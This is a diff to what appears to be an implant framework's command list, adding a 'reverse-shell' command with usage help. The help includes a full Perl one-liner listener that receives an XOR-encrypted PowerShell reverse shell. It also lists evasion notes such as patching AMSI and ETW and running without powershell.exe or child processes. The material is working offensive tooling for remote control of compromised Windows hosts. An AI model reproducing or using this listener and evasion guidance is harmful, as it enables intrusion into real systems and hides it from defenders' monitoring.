@@ -466,3 +466,38 @@
 
       Will return the user ID that Implant is running as using the Windows API. 
       Will add an asterisk to the name (*) if the user's token is elevated.
+
+  - command: "reverse-shell"
+    description: "Start a PowerShell reverse shell with XOR encryption"
+    help: |
+      [RISKY COMMAND]
+      Starts a PowerShell reverse shell that connects to the specified IP and port.
+      The communication is encrypted using XOR with a 32-bit key.
+      
+      Usage:
+        reverse-shell <IP:PORT> <XOR_KEY>
+      
+      Arguments:
+        IP:PORT    - Target IP and port in format IP:PORT (e.g., 192.168.1.100:4444)
+        XOR_KEY    - Required 32-bit XOR key in decimal or hex (0x prefix)
+      
+      Example:
+        reverse-shell 192.168.1.100:4444 0x41424344
+        reverse-shell 192.168.1.100:4444 123456789
+      
+      To receive the shell, use the following Perl command, dont forget to replace the XOR_KEY and PORT with your own:
+      
+      ```
+      perl -e '$KEY=0x41414242;$PORT=9999;use IO::Socket::INET;use MIME::Base64;$|=1;my $k0=($KEY>>24)&0xFF;my $k1=($KEY>>16)&0xFF;my $k2=($KEY>>8)&0xFF;my $k3=$KEY&0xFF;sub d{my $s=shift;return""unless $s;my $b;eval{$b=decode_base64($s)};return"[Error]"if$@;my $r="";for(my $i=0;$i<length($b);$i++){my $kb=$i%4==0?$k0:$i%4==1?$k1:$i%4==2?$k2:$k3;$r.=chr(ord(substr($b,$i,1))^$kb);}return $r;}sub e{my $s=shift;my $r="";for(my $i=0;$i<length($s);$i++){my $kb=$i%4==0?$k0:$i%4==1?$k1:$i%4==2?$k2:$k3;$r.=chr(ord(substr($s,$i,1))^$kb);}return encode_base64($r,"");}$s=IO::Socket::INET->new(Proto=>"tcp",LocalAddr=>"0.0.0.0",LocalPort=>$PORT,Listen=>1,Reuse=>1)or die;print"\n[*] Waiting for connection on port $PORT with XOR key 0x".sprintf("%X",$KEY)."...\n";$c=$s->accept();print"[*] Connection received\n";$c->autoflush(1);while(<$c>){chomp;next unless $_;print d($_)."\n";print"> ";$i=<STDIN>;last unless defined $i;chomp $i;last if $i eq"exit";$c->print(e($i)."\n");}$c->close();$s->close();'
+      ```
+      
+      Replace $XOR_KEY with your key and $PORT with your listening port.
+      
+      OPSEC Considerations:
+      - Uses unmanaged PowerShell runspace (no powershell.exe process)
+      - Communication is XOR encrypted with user-provided key
+      - AMSI and ETW are patched by default
+      - No child processes are created
+      - Uses direct CLR loading
+      - No hardcoded encryption keys
+    risky_command: true
